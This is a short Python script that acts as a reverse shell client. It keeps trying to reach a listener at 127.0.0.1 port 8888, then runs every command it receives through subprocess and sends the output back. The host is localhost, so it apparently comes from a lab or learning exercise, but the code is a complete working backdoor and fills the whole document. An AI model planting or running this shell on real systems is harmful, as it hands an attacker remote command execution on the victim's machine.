#!/usr/bin/python3
import socket
import subprocess
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
	try:
		print('connecting')
		client.connect(("127.0.0.1",8888))
		break
	except ConnectionRefusedError:
		pass
print("connected")
while True:
	cmd=(client.recv(1024)).decode()
	if cmd=="exit":
		break
	else:		
		output=subprocess.getoutput(cmd)
		client.send(output.encode())
	
client.close()
